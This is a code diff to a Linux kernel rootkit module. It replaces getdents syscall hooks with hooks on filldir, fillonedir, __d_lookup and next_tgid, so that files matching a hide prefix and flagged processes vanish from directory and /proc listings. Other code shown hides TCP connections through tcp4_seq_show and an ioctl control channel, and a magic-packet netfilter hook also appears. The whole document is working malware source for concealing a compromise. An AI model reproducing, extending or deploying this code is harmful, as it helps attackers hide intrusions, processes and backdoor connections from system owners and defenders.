@@ -87,11 +87,9 @@ struct shell_task {
 	char *secret;
 };
 
-struct linux_dirent {
-	unsigned long d_ino;
-	unsigned long d_off;
-	unsigned short d_reclen;
-	char d_name[1];
+struct tgid_iter {
+	unsigned int tgid;
+	struct task_struct *task;
 };
 
 struct hidden_conn {
@@ -106,8 +104,7 @@ struct ksym {
 	unsigned long addr;
 };
 
-int find_ksym(void *data, const char *name, struct module *module,
-	      unsigned long address)
+int find_ksym(void *data, const char *name, struct module *module, unsigned long address)
 {
 	struct ksym *ksym = (struct ksym *)data;
 	char *target = ksym->name;
@@ -160,24 +157,6 @@ void show(void)
 	hide_module = 0;
 }
 
-struct task_struct *find_task(pid_t pid)
-{
-	struct task_struct *p = current;
-	struct task_struct *ret = NULL;
-
-	rcu_read_lock();
-	for_each_process(p)
-	{
-		if (p->pid == pid) {
-			get_task_struct(p);
-			ret = p;
-		}
-	}
-	rcu_read_unlock();
-
-	return ret;
-}
-
 int flag_tasks(pid_t pid, int set)
 {
 	int ret = 0;
@@ -211,6 +190,24 @@ int flag_tasks(pid_t pid, int set)
 		put_pid(p);
 	}
 	rcu_read_unlock();
+	return ret;
+}
+
+struct task_struct *find_task(pid_t pid)
+{
+	struct task_struct *p = current;
+	struct task_struct *ret = NULL;
+
+	rcu_read_lock();
+	for_each_process(p)
+	{
+		if (p->pid == pid) {
+			get_task_struct(p);
+			ret = p;
+		}
+	}
+	rcu_read_unlock();
+
 	return ret;
 }
 
@@ -687,134 +684,118 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 	return NF_ACCEPT;
 }
 
-KHOOK(sys_getdents64);
-static int khook_sys_getdents64(unsigned int fd,
-				struct linux_dirent64 __user *dirent,
-				unsigned int count)
+KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_fillonedir(void *__buf, const char *name, int namlen,
+			    loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret;
-	unsigned short p = 0;
-	unsigned long off = 0;
-	struct linux_dirent64 *dir, *kdir, *prev = NULL;
-	struct inode *d_inode;
-	char *hide = HIDE;
-
-	KHOOK_GET(sys_getdents64);
-	ret = KHOOK_ORIGIN(sys_getdents64, fd, dirent, count);
-
-	if (!hidden)
-		goto final;
-
-	if (ret <= 0)
-		goto final;
-
-	kdir = kzalloc(ret, GFP_KERNEL);
-	if (kdir == NULL)
-		goto final;
-
-	if (copy_from_user(kdir, dirent, ret))
-		goto end;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
-		p = 1;
-
-	while (off < ret) {
-		dir = (void *)kdir + off;
-		if ((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) ||
-		    (p &&
-		     is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdir) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else {
-			prev = dir;
-		}
-		off += dir->d_reclen;
-	}
-	if (copy_to_user(dirent, kdir, ret))
-		goto end;
-
-end:
-	kfree(kdir);
-final:
-	KHOOK_PUT(sys_getdents64);
+	int ret = 0;
+	KHOOK_GET(fillonedir);
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
+	KHOOK_PUT(fillonedir);
 	return ret;
 }
 
-KHOOK(sys_getdents);
-static int khook_sys_getdents(unsigned int fd,
-			      struct linux_dirent __user *dirent,
-			      unsigned int count)
+KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_filldir(void *__buf, const char *name, int namlen,
+			 loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret;
-	unsigned short p = 0;
-	unsigned long off = 0;
-	struct linux_dirent *dir, *kdir, *prev = NULL;
-	struct inode *d_inode;
-	char *hide = HIDE;
-
-	KHOOK_GET(sys_getdents);
-	ret = KHOOK_ORIGIN(sys_getdents, fd, dirent, count);
-
-	if (!hidden)
-		goto final;
-
-	if (ret <= 0)
-		goto final;
-
-	kdir = kzalloc(ret, GFP_KERNEL);
-	if (kdir == NULL)
-		goto final;
-
-	if (copy_from_user(kdir, dirent, ret))
-		goto end;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
-		p = 1;
-
-	while (off < ret) {
-		dir = (void *)kdir + off;
-		if ((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) ||
-		    (p &&
-		     is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdir) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else {
-			prev = dir;
-		}
-		off += dir->d_reclen;
-	}
-	if (copy_to_user(dirent, kdir, ret))
-		goto end;
-
-end:
-	kfree(kdir);
-
-final:
-	KHOOK_PUT(sys_getdents);
+	int ret = 0;
+	KHOOK_GET(filldir);
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
+	KHOOK_PUT(filldir);
 	return ret;
 }
 
-KHOOK_EXT(ssize_t, vfs_read, struct file *file, char __user *buf, size_t count, loff_t *pos);
-static ssize_t khook_vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
+KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_filldir64(void *__buf, const char *name, int namlen,
+			   loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	KHOOK_GET(filldir64);
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
+	KHOOK_PUT(filldir64);
+	return ret;
+}
+
+KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
+				   loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	KHOOK_GET(compat_fillonedir);
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
+	KHOOK_PUT(compat_fillonedir);
+	return ret;
+}
+
+KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_filldir(void *__buf, const char *name, int namlen,
+				loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	KHOOK_GET(compat_filldir);
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
+	KHOOK_PUT(compat_filldir);
+	return ret;
+}
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
+KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
+				  loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	KHOOK_GET(compat_filldir64);
+	if (!strstr(name, HIDE) || !hidden)
+		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
+	KHOOK_PUT(compat_filldir64);
+	return ret;
+}
+#endif
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
+KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
+struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
+#else
+KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
+struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
+#endif
+{
+	struct dentry *found = NULL;
+	KHOOK_GET(__d_lookup);
+	if (!strstr(name->name, HIDE) || !hidden)
+		found = KHOOK_ORIGIN(__d_lookup, parent, name);
+	KHOOK_PUT(__d_lookup);
+	return found;
+}
+
+KHOOK_EXT(struct tgid_iter, next_tgid, struct pid_namespace *, struct tgid_iter);
+static struct tgid_iter khook_next_tgid(struct pid_namespace *ns, struct tgid_iter iter)
+{
+	KHOOK_GET(next_tgid);
+	if (hidden) {
+		while ((iter = KHOOK_ORIGIN(next_tgid, ns, iter), iter.task) != NULL) {
+			if (!(iter.task->flags & FLAG))
+				break;
+
+			iter.tgid++;
+		}
+	} else {
+		iter = KHOOK_ORIGIN(next_tgid, ns, iter);
+	}
+
+	KHOOK_PUT(next_tgid);
+	return iter;
+}
+
+KHOOK_EXT(ssize_t, vfs_read, struct file *, char __user *, size_t, loff_t *);
+static ssize_t khook_vfs_read(struct file *file, char __user *buf,
+			      size_t count, loff_t *pos)
 {
 	ssize_t ret;
 
@@ -830,8 +811,7 @@ static ssize_t khook_vfs_read(struct file *file, char __user *buf, size_t count,
 	return ret;
 }
 
-KHOOK_EXT(int, inet_ioctl, struct socket *sock, unsigned int cmd,
-	  unsigned long arg);
+KHOOK_EXT(int, inet_ioctl, struct socket *, unsigned int, unsigned long);
 static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 			    unsigned long arg)
 {
@@ -839,7 +819,6 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 	unsigned int pid;
 	struct control args;
 	struct sockaddr_in addr;
-	//struct task_struct *task;
 	struct hidden_conn *hc;
 
 	KHOOK_GET(inet_ioctl);
@@ -868,8 +847,7 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 			}
 			break;
 		case 1:
-			if (copy_from_user(&pid, args.argv,
-					   sizeof(unsigned int)))
+			if (copy_from_user(&pid, args.argv, sizeof(unsigned int)))
 				goto out;
 
 			if (is_invisible(pid))
@@ -901,8 +879,7 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 #endif
 			break;
 		case 4:
-			if (copy_from_user(&addr, args.argv,
-					   sizeof(struct sockaddr_in)))
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
 				goto out;
 
 			hc = kmalloc(sizeof(*hc), GFP_KERNEL);
@@ -915,8 +892,7 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 			list_add(&hc->list, &hidden_tcp_conn);
 			break;
 		case 5:
-			if (copy_from_user(&addr, args.argv,
-					   sizeof(struct sockaddr_in)))
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
 				goto out;
 
 			list_for_each_entry(hc, &hidden_tcp_conn, list)
@@ -944,7 +920,7 @@ out:
 	return ret;
 }
 
-KHOOK_EXT(int, tcp4_seq_show, struct seq_file *seq, void *v);
+KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
 static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
 	int ret;
@@ -956,7 +932,7 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 
 	KHOOK_GET(tcp4_seq_show);
 
-	//seq_setwidth(seq, TMPSZ - 1);
+	// seq_setwidth(seq, TMPSZ - 1);
 	if (v == SEQ_START_TOKEN) {
 		ret = 0;
 		goto out;
@@ -987,7 +963,7 @@ out:
 	return ret;
 }
 
-KHOOK_EXT(int, load_elf_binary, struct linux_binprm *bprm);
+KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
 static int khook_load_elf_binary(struct linux_binprm *bprm)
 {
 	int ret = 0;
